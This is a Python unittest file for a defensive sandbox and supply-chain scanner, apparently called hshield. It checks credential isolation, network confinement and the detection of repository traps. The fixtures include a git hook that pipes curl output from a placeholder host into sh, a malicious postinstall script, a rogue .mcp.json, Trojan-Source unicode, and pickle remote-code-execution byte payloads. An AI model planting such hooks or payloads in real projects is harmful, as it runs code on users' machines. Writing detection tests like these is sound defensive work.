import json
import os
from pathlib import Path
import pickle
import socket
import subprocess
import tempfile
import unittest
import zipfile

REPO_ROOT = Path(__file__).resolve().parent.parent
HSHIELD_BIN = REPO_ROOT / "hshield"
SCAN_BIN = REPO_ROOT / "hshield-supply-scan"


class TestHShieldContainmentAndStaticGates(unittest.TestCase):
    def test_01_landlock_sandbox_blocks_ssh_and_enforces_allow_write(self) -> None:
        # Place simulated $HOME under /var/tmp (outside /tmp, which Landlock allows as scratch)
        base_tmp = "/var/tmp" if os.path.isdir("/var/tmp") else None
        with tempfile.TemporaryDirectory(dir=base_tmp) as fake_home, tempfile.TemporaryDirectory(dir=base_tmp) as work_dir:
            ssh_dir = Path(fake_home) / ".ssh"
            ssh_dir.mkdir(mode=0o700)
            secret_key = ssh_dir / "id_ed25519"
            secret_key.write_text("TEST_SSH_MATERIAL\n", encoding="utf-8")

            benign_doc = Path(fake_home) / "notes.txt"
            benign_doc.write_text("public-note\n", encoding="utf-8")

            env = dict(os.environ)
            env["HOME"] = fake_home

            # Attempting to read ~/.ssh/id_ed25519 inside Landlock sandbox must fail (or skip cleanly if kernel lacks Landlock)
            probe = subprocess.run(
                [str(HSHIELD_BIN), "sandbox", "--allow-write", work_dir, "--", "cat", str(secret_key)],
                env=env,
                capture_output=True,
                text=True,
            )
            if "Landlock LSM unavailable" in probe.stderr:
                self.skipTest("Landlock LSM not enabled on host kernel")

            self.assertNotEqual(probe.returncode, 0)
            self.assertNotIn("TEST_SSH_MATERIAL", probe.stdout)

            # Ordinary non-sensitive read + explicit --allow-write output must succeed
            out_file = Path(work_dir) / "allowed.txt"
            ok_run = subprocess.run(
                [
                    str(HSHIELD_BIN),
                    "sandbox",
                    "--allow-write",
                    work_dir,
                    "--",
                    "python3",
                    "-c",
                    f"from pathlib import Path; s = Path({str(benign_doc)!r}).read_text(); Path({str(out_file)!r}).write_text(s)",
                ],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertEqual(ok_run.returncode, 0, msg=ok_run.stderr)
            self.assertEqual(out_file.read_text(encoding="utf-8"), "public-note\n")

    def test_02_repo_audit_detects_mcp_hooks_and_trojan_unicode(self) -> None:
        with tempfile.TemporaryDirectory() as clean_repo, tempfile.TemporaryDirectory() as trapped_repo:
            (Path(clean_repo) / "README.md").write_text("# Clean Library\nSafe documentation.\n", encoding="utf-8")
            r_clean = subprocess.run(
                [str(HSHIELD_BIN), "audit", clean_repo, "--json"],
                capture_output=True,
                text=True,
            )
            self.assertEqual(r_clean.returncode, 0, msg=r_clean.stdout)
            self.assertTrue(json.loads(r_clean.stdout)["ok"])

            # Untrusted repository containing rogue .mcp.json and Trojan-Source bidi override in AGENTS.md
            (Path(trapped_repo) / ".mcp.json").write_text('{"mcpServers":{"rogue":{"command":"sh"}}}', encoding="utf-8")
            (Path(trapped_repo) / "AGENTS.md").write_text("Normal header \u202e hidden bidi directive\n", encoding="utf-8")
            r_trap = subprocess.run(
                [str(HSHIELD_BIN), "audit", trapped_repo, "--json"],
                capture_output=True,
                text=True,
            )
            self.assertNotEqual(r_trap.returncode, 0)
            payload = json.loads(r_trap.stdout)
            self.assertFalse(payload["ok"])
            self.assertGreaterEqual(payload["issues"], 2)
            self.assertIn("untrusted_repo_agent_trap:.mcp.json", payload["findings"])
            self.assertIn("zero_width_or_bidi_trojan_unicode", payload["findings"])

    def test_03_supply_scan_pickle_protocols_and_zip_archives(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)

            # 1. Benign Pickle protocol 4 dictionary
            benign_pkl = root / "weights_meta.pkl"
            benign_pkl.write_bytes(pickle.dumps({"epoch": 12, "val_loss": 0.142, "layers": [64, 128]}, protocol=4))
            r1 = subprocess.run([str(SCAN_BIN), "--json", str(benign_pkl)], capture_output=True, text=True)
            self.assertEqual(r1.returncode, 0)
            self.assertFalse(json.loads(r1.stdout)["malicious"])

            # 2. Synthetic Pickle Protocol-0 RCE opcode sequence (constructed as inert bytes, never unpickled)
            proto0_rce = root / "malicious_p0.pkl"
            proto0_rce.write_bytes(b"cposix\nsystem\n(S'id'\ntR.")
            r2 = subprocess.run([str(SCAN_BIN), "--json", str(proto0_rce)], capture_output=True, text=True)
            self.assertEqual(r2.returncode, 1)
            p2 = json.loads(r2.stdout)
            self.assertTrue(p2["malicious"])
            self.assertIn("pickle-rce-proto0:cposix.system", p2["finding"])

            # 3. Synthetic Pickle Protocol-4 STACK_GLOBAL + REDUCE sequence inside a PyTorch-style .pt ZIP archive
            proto4_bytes = b"\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x8c\x06system\x93\x8c\x02id\x85R."
            pt_archive = root / "checkpoint.pt"
            with zipfile.ZipFile(pt_archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("archive/version", "3\n")
                zf.writestr("archive/data.pkl", proto4_bytes)

            r3 = subprocess.run([str(SCAN_BIN), "--json", str(pt_archive)], capture_output=True, text=True)
            self.assertEqual(r3.returncode, 1)
            p3 = json.loads(r3.stdout)
            self.assertTrue(p3["malicious"])
            self.assertIn("pickle-rce-opcode:posix.system+REDUCE", p3["finding"])

            # 4. Disguised ELF binary named as a PDF document
            fake_pdf = root / "spec_sheet.pdf"
            fake_pdf.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)
            r4 = subprocess.run([str(SCAN_BIN), "--json", str(fake_pdf)], capture_output=True, text=True)
            self.assertEqual(r4.returncode, 1)
            self.assertEqual(json.loads(r4.stdout)["finding"], "disguised-elf-binary-as-pdf")

    def test_04_landlock_tcp_network_confinement(self) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv_allow, \
             socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv_block:
            srv_allow.bind(("127.0.0.1", 0))
            srv_allow.listen(4)
            port_allowed = srv_allow.getsockname()[1]

            srv_block.bind(("127.0.0.1", 0))
            srv_block.listen(4)
            port_blocked = srv_block.getsockname()[1]

            # 1. --deny-net blocks all TCP outbound connections
            deny_run = subprocess.run(
                [
                    str(HSHIELD_BIN),
                    "sandbox",
                    "--deny-net",
                    "--",
                    "python3",
                    "-c",
                    f"import socket; s = socket.create_connection(('127.0.0.1', {port_allowed}), timeout=2.0); s.close()",
                ],
                capture_output=True,
                text=True,
            )
            if "Landlock LSM unavailable" in deny_run.stderr or "TCP confinement unavailable" in deny_run.stderr:
                self.skipTest("Host kernel lacks Landlock ABI v4+ TCP confinement")
            self.assertNotEqual(deny_run.returncode, 0)

            # 2. --deny-net --allow-tcp-connect <port_allowed> permits allowed port...
            allow_run = subprocess.run(
                [
                    str(HSHIELD_BIN),
                    "sandbox",
                    "--deny-net",
                    "--allow-tcp-connect",
                    str(port_allowed),
                    "--",
                    "python3",
                    "-c",
                    f"import socket; s = socket.create_connection(('127.0.0.1', {port_allowed}), timeout=2.0); s.close()",
                ],
                capture_output=True,
                text=True,
            )
            self.assertEqual(allow_run.returncode, 0, msg=allow_run.stderr)

            # 3. ...while still blocking non-whitelisted TCP connect ports
            block_other = subprocess.run(
                [
                    str(HSHIELD_BIN),
                    "sandbox",
                    "--deny-net",
                    "--allow-tcp-connect",
                    str(port_allowed),
                    "--",
                    "python3",
                    "-c",
                    f"import socket; s = socket.create_connection(('127.0.0.1', {port_blocked}), timeout=2.0); s.close()",
                ],
                capture_output=True,
                text=True,
            )
            self.assertNotEqual(block_other.returncode, 0)

            # 4. ...and blocking TCP bind() when no --allow-tcp-bind port is specified
            block_bind = subprocess.run(
                [
                    str(HSHIELD_BIN),
                    "sandbox",
                    "--deny-net",
                    "--allow-tcp-connect",
                    str(port_allowed),
                    "--",
                    "python3",
                    "-c",
                    "import socket; s = socket.socket(); s.bind(('127.0.0.1', 0)); s.close()",
                ],
                capture_output=True,
                text=True,
            )
            self.assertNotEqual(block_bind.returncode, 0)


    def test_05_sandbox_dev_isolation_and_multi_allow_write(self) -> None:
        base_tmp = "/var/tmp" if os.path.isdir("/var/tmp") else None
        with tempfile.TemporaryDirectory(dir=base_tmp) as fake_home,              tempfile.TemporaryDirectory(dir=base_tmp) as dir_a,              tempfile.TemporaryDirectory(dir=base_tmp) as dir_b:
            aws_dir = Path(fake_home) / ".aws"
            aws_dir.mkdir(mode=0o700)
            aws_creds = aws_dir / "credentials"
            aws_creds.write_text("SECRET_AWS_KEY=123\n", encoding="utf-8")

            env = dict(os.environ)
            env["HOME"] = fake_home

            # 1. /dev/shm must NOT be writable inside sandbox (safe char devices only)
            shm_probe = f"/dev/shm/hshield_sandbox_probe_{os.getpid()}"
            p_shm = subprocess.run(
                [
                    str(HSHIELD_BIN), "sandbox",
                    "--allow-write", dir_a,
                    "--",
                    "python3", "-c",
                    f"open({shm_probe!r}, 'w').write('escape')",
                ],
                env=env,
                capture_output=True,
                text=True,
            )
            if "Landlock LSM unavailable" in p_shm.stderr:
                self.skipTest("Landlock LSM not enabled on host kernel")
            self.assertNotEqual(p_shm.returncode, 0, msg="Sandbox unexpectedly allowed write to /dev/shm!")
            self.assertFalse(os.path.exists(shm_probe))

            # 2. Multiple --allow-write flags must BOTH be writable, while /dev/null still works
            fa = Path(dir_a) / "a.txt"
            fb = Path(dir_b) / "b.txt"
            p_multi = subprocess.run(
                [
                    str(HSHIELD_BIN), "sandbox",
                    "--allow-write", dir_a,
                    "--allow-write", dir_b,
                    "--",
                    "python3", "-c",
                    f"from pathlib import Path; open('/dev/null','w').write('ok'); Path({str(fa)!r}).write_text('A'); Path({str(fb)!r}).write_text('B')",
                ],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertEqual(p_multi.returncode, 0, msg=p_multi.stderr)
            self.assertEqual(fa.read_text(encoding="utf-8"), "A")
            self.assertEqual(fb.read_text(encoding="utf-8"), "B")

            # 3. Attempting --allow-write on ~/.aws must be refused
            p_aws = subprocess.run(
                [
                    str(HSHIELD_BIN), "sandbox",
                    "--allow-write", str(aws_dir),
                    "--",
                    "cat", str(aws_creds),
                ],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertNotEqual(p_aws.returncode, 0)
            self.assertIn("refusing --allow-write on sensitive path", p_aws.stderr)
            self.assertNotIn("SECRET_AWS_KEY", p_aws.stdout)

    def test_06_recursive_audit_traps_and_readonly_default(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            sub = root / "nested" / "src"
            sub.mkdir(parents=True)
            (sub / 'evil"quote.txt').write_text("hello \u202e hidden\n", encoding="utf-8")

            hooks_dir = root / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)
            hook = hooks_dir / "pre-commit"
            hook.write_text("#!/bin/sh\ncurl -s https://example.invalid | sh\n", encoding="utf-8")
            hook.chmod(0o755)

            (root / "package.json").write_text('{"scripts":{"postinstall":"bash -c id"}}\n', encoding="utf-8")
            (root / "escape_link").symlink_to("/etc/passwd")
            mcp = root / ".mcp.json"
            mcp.write_text('{"mcpServers":{"x":{"command":"sh"}}}\n', encoding="utf-8")

            # Default audit MUST be read-only (must NOT rename .mcp.json) and find all 5 trap classes
            r = subprocess.run(
                [str(HSHIELD_BIN), "audit", str(root), "--json"],
                capture_output=True,
                text=True,
            )
            self.assertEqual(r.returncode, 1)
            payload = json.loads(r.stdout)
            self.assertFalse(payload["ok"])
            self.assertGreaterEqual(payload["issues"], 5)
            kinds = {d["kind"] for d in payload["finding_details"]}
            self.assertTrue({"trojan_unicode", "git_hook_trap", "build_script_trap", "symlink_escape", "agent_config_trap"}.issubset(kinds))
            self.assertTrue(mcp.exists(), msg="Read-only audit unexpectedly mutated .mcp.json")

            # Opt-in --quarantine renames untrusted .mcp.json
            rq = subprocess.run(
                [str(HSHIELD_BIN), "audit", str(root), "--quarantine", "--json"],
                capture_output=True,
                text=True,
            )
            self.assertEqual(rq.returncode, 1)
            self.assertFalse(mcp.exists())
            self.assertTrue((root / ".mcp.json.blocked_by_hshield").exists())

    def test_07_supply_scan_opcode_zip_bypasses_and_cli(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)

            # 1. --version and --help work cleanly, and error message has real newline (not literal \n)
            rv = subprocess.run([str(SCAN_BIN), "--version"], capture_output=True, text=True, check=True)
            self.assertIn("0.2.1", rv.stdout)
            rh = subprocess.run([str(SCAN_BIN), "--help"], capture_output=True, text=True, check=True)
            self.assertIn("Usage:", rh.stdout)
            rmiss = subprocess.run([str(SCAN_BIN), str(root / "no_such_file.pkl")], capture_output=True, text=True)
            self.assertEqual(rmiss.returncode, 2)
            self.assertNotIn("\\n", rmiss.stderr)
            self.assertTrue(rmiss.stderr.endswith("\n"))

            # 2. Pickle NEWOBJ (0x81) bypass without REDUCE ('R')
            newobj_pkl = root / "newobj_bypass.pkl"
            newobj_pkl.write_bytes(b"\x80\x04\x8c\x09importlib\x8c\x0dimport_module\x93\x8c\x02os\x85\x81.")
            r_no = subprocess.run([str(SCAN_BIN), "--json", str(newobj_pkl)], capture_output=True, text=True)
            self.assertEqual(r_no.returncode, 1)
            self.assertTrue(json.loads(r_no.stdout)["malicious"])

            # 3. 0-byte .mcp.json inside ZIP must still be flagged
            z_zero = root / "zero_mcp.zip"
            with zipfile.ZipFile(z_zero, "w", compression=zipfile.ZIP_STORED) as zf:
                zf.writestr("repo/.mcp.json", "")
            r_zz = subprocess.run([str(SCAN_BIN), "--json", str(z_zero)], capture_output=True, text=True)
            self.assertEqual(r_zz.returncode, 1)
            self.assertIn("archive-repo-trap", json.loads(r_zz.stdout)["finding"])

            # 4. Large (>256 KiB compressed) .pkl inside .pt ZIP must NOT be skipped
            z_big = root / "padded_big.pt"
            payload = b"\x80\x04\x8c\x05posix\x8c\x06system\x93\x8c\x02id\x85R." + os.urandom(300_000)
            with zipfile.ZipFile(z_big, "w", compression=zipfile.ZIP_STORED) as zf:
                zf.writestr("archive/data.pkl", payload)
            r_big = subprocess.run([str(SCAN_BIN), "--json", str(z_big)], capture_output=True, text=True)
            self.assertEqual(r_big.returncode, 1)
            self.assertTrue(json.loads(r_big.stdout)["malicious"])


if __name__ == "__main__":
    unittest.main()
